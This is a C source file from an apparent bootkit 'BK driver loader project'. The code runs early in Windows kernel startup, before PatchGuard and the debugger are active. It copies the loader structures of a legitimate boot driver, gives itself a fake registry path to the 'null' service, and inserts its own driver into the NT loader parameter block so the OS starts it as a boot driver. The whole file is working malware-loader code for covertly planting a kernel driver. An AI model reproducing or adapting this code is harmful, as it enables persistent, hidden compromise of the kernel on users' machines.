//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2
//	
// module: driver.c
// $Revision: 79 $
// $Date: 2012-06-21 20:04:44 +0400 (Чт, 21 июн 2012) $
// description: 
//	BK helper library. BK driver initialization routines.
//	Here we resolve our driver's import and linking our driver into the Loader Parameter Block.

#include "main.h"
#include "bklib.h"
#include "pesup.h"

// NT loader parameter block
typedef struct LOADER_PARAMETER_BLOCK
{
     LIST_ENTRY LoadOrderListHead;
     LIST_ENTRY MemoryDescriptorListHead;
     LIST_ENTRY BootDriverListHead;
     ULONG KernelStack;
     ULONG Prcb;
     ULONG Process;
     ULONG Thread;
     ULONG RegistryLength;
     PVOID RegistryBase;
     PVOID ConfigurationRoot;
     CHAR * ArcBootDeviceName;
     CHAR * ArcHalDeviceName;
     CHAR * NtBootPathName;
     CHAR * NtHalPathName;
     CHAR * LoadOptions;
     PVOID NlsData;
     PVOID ArcDiskInformation;
     PVOID OemFontFile;
     PVOID SetupLoaderBlock;
     PVOID Extension;
     UCHAR u[12];
     PVOID FirmwareInformation;
} LOADER_PARAMETER_BLOCK, *PLOADER_PARAMETER_BLOCK;

// BK-specific loader context
typedef struct _BK_LDR_CONTEXT
{
	PVOID					DriverBase;			// Current driver image base
	PVOID					DriverEntry;		// Current driver entry address
	ULONG_PTR				DriverSize;			// Current driver image size
	PVOID					NtImageBase;		// NT kernel image base
	PLOADER_PARAMETER_BLOCK	NtLoaderBlock;		// KeLoaderBlock pointer
} BK_LDR_CONTEXT, *PBK_LDR_CONTEXT;

// An entry structure of LOADER_PARAMETER_BLOCK.BootDriverListHead
typedef struct _BOOT_DRIVER_LIST_ENTRY {
    LIST_ENTRY		Link;
    UNICODE_STRING	FilePath;
    UNICODE_STRING	RegistryPath;
    PLDR_DATA_TABLE_ENTRY LdrEntry;
	ULONG Unknown0;
	ULONG Unknown1;	
} BOOT_DRIVER_LIST_ENTRY, *PBOOT_DRIVER_LIST_ENTRY;

// The registry path required by IopInitializeBootDrivers() function.
// It should be valid and it shouldn't be the path of any driver already loaded, because NT uses it to 
//  generate the original name for the driver object.
#define	wczRegPath		L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\null" 
#define	szArcName		"\\ArcName\\"
#define	szNtBuildNumber	"NtBuildNumber"

// Following structures should be allocated globally and should be pre-initialized with zeroes 
static	LDR_DATA_TABLE_ENTRY_EX	MyLdrDataTableEntry		= {0};
static	BOOT_DRIVER_LIST_ENTRY	MyBootDriverListEntry	= {0};
static  UNICODE_STRING			MyRegistryPath			= {sizeof(wczRegPath) - sizeof(WCHAR), sizeof(wczRegPath), wczRegPath};

// Global variables
PVOID	BkNtKernelBase	= NULL;	// NT kernel base
PVOID	BkImageBase		= NULL;	// Current driver base


//
// Retrieves the address of an exported function or variable from the specified module.
//
PVOID	BkGetFunctionAddress(
	PVOID		ImageBase,			// target module base
	PCHAR		FunctionName		// target function name
	)
{
	return(PeSupGetFunctionAddress(ImageBase, FunctionName));
}


//
// Retrieves a module base for the specified module.
//
PVOID	BkGetModuleBase(
	PCHAR	ModuleName
	)
{
	return(PeSupGetModuleBase(ModuleName));
}


//
//	Returns the export entry address for the specified function of the specified module.
//
PVOID	BkGetExportEntry(
	PVOID	ImageBase,
	PCHAR	FunctionName
	)
{
	return(PeSupGetExportEntry(ImageBase, FunctionName));
}


//
//	Resolves specified executable image import.
//
NTSTATUS BkResolveImageImport(
	PVOID	ImageBase,
	PBK_GET_MODULE_BASE	pBkGetModuleBase
	)
{
	return(PeSupResolveImageImport(ImageBase, pBkGetModuleBase));
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	This functon used instead of memcpy() because original memcpy() for x64 compiled with SSE instuctions.
//
static void* xmemcpy (
	void * dst,
	const void * src,
	size_t count
	)
{
        void * ret = dst;

        /*
         * copy from lower addresses to higher addresses
         */
        while (count--) {
                *(char *)dst = *(char *)src;
                dst = (char *)dst + 1;
                src = (char *)src + 1;
        }
        return(ret);
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	This functon used instead of strcpy() because original strcpy() for x64 compiled with SSE instuctions.
//
static int xstrcpy (
	char * dst,
	const char * src
	)
{
	int	count = 0;
	char c;

	while(c = src[0])
	{
		dst[0] = c;
		count += 1;
		dst += 1;
		src += 1;
	}
	dst[0] = c;
    return(count);
}


//
//	Driver initialization routine.
//	Called from nt!KiSystemStartup. 
//	IDT is not initialized yet. Interrupts are disabled. Only one CPU enabled. No PatchGuard. IRQL = DISPATCH_LEVEL. 
//	Debugger is unaccessable since KD is not initialized too.
//	SSE, SSE2 should be used very carefully, since no SSE state was saved before the call.
//
NTSTATUS	BkInstall(
	PBK_LDR_CONTEXT	LdrContext
	)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PBOOT_DRIVER_LIST_ENTRY	pBootDriverListEntry;
	PLDR_DATA_TABLE_ENTRY	pLdrDataTableEntry;
	ULONG	Length;
	USHORT	NtBuild;

	BkNtKernelBase	= LdrContext->NtImageBase;
	BkImageBase		= LdrContext->DriverBase;

	// Initializing loaded module list pointer
	PeSupLoadedModuleList = &LdrContext->NtLoaderBlock->LoadOrderListHead;

	// Resolving NtBuildNumber value
	NtBuild = *(PUSHORT)PeSupGetFunctionAddress(BkNtKernelBase, szNtBuildNumber);

	// Resolving current driver's import
	PeSupResolveImageImport(BkImageBase, NULL);

	pBootDriverListEntry =	CONTAINING_RECORD(LdrContext->NtLoaderBlock->BootDriverListHead.Flink, BOOT_DRIVER_LIST_ENTRY, Link);
	pLdrDataTableEntry = CONTAINING_RECORD(LdrContext->NtLoaderBlock->LoadOrderListHead.Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);

	// Initializing our driver boot list entry
	// Copying whole structure from any other valid driver. Actually we need any driver path only.
	xmemcpy(&MyBootDriverListEntry, pBootDriverListEntry, sizeof(BOOT_DRIVER_LIST_ENTRY));
	//	Initializing list entry and pointer
	InitializeListHead(&MyBootDriverListEntry.Link);
	MyBootDriverListEntry.LdrEntry = (PLDR_DATA_TABLE_ENTRY)&MyLdrDataTableEntry;
	// IopInitializeBootDrivers requires driver registry path to be valid and accessable.
	xmemcpy(&MyBootDriverListEntry.RegistryPath, &MyRegistryPath, sizeof(UNICODE_STRING));

	// Initializing our driver loader data table entry
	// Calculating LDR_DATA_TABLE_ENTRY structure size depending on current OS version
	Length = ((NtBuild < 6000) ? sizeof(LDR_DATA_TABLE_ENTRY) : ((NtBuild < 7000) ? sizeof(LDR_DATA_TABLE_ENTRY_WIN6) : \
		((NtBuild < 8000) ? sizeof(LDR_DATA_TABLE_ENTRY_WIN7) : sizeof(LDR_DATA_TABLE_ENTRY_WIN8))));
	// Copying whole structure from any other valid driver. We need valid flags and system pointers here.
	xmemcpy(&MyLdrDataTableEntry, pLdrDataTableEntry, Length);
	InitializeListHead(&MyLdrDataTableEntry.InLoadOrderModuleList);

	// Following fields have the same offsets on all OS version
	MyLdrDataTableEntry.DllBase = LdrContext->DriverBase;
	MyLdrDataTableEntry.EntryPoint = LdrContext->DriverEntry;
	MyLdrDataTableEntry.SizeOfImage = (ULONG)LdrContext->DriverSize;

	// Registering our driver within the loader parameter block
	InsertTailList(&LdrContext->NtLoaderBlock->LoadOrderListHead, &MyLdrDataTableEntry.InLoadOrderModuleList);
	InsertTailList(&LdrContext->NtLoaderBlock->BootDriverListHead, &MyBootDriverListEntry.Link);

	return(ntStatus);
}


//
//	BK initialization routine. Normally called twice: 
//	 - when BK loads the driver, is this case pDriverObject == 0 and pusRegistryPath is pointer to PBK_LDR_CONTEXT structure.
//	 - when the driver being registered by the OS.
//
NTSTATUS BkInitialize(
	PVOID					pDriverObject,
	PUNICODE_STRING			pusRegistryPath,
	PBK_INSTALL_CALLBACK	pfnInstallRoutine,
	PBK_DRIVER_CALLBACK		pfnDriverRoutine
	)
{
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;

	if (pDriverObject)
	{
		// Driver being registered by the OS, calling driver startup routine
		if (pfnDriverRoutine)
			ntStatus = (pfnDriverRoutine) (pDriverObject, pusRegistryPath);
	}
	else
	{
		// pDriverObject is NULL means we are called by the BK and 
		//	pusRegistryPath parameter contains pointer to BK_LDR_CONTEXT structure.
		if (pfnInstallRoutine)
			ntStatus = (pfnInstallRoutine)(pusRegistryPath);
	}

	return(ntStatus);
}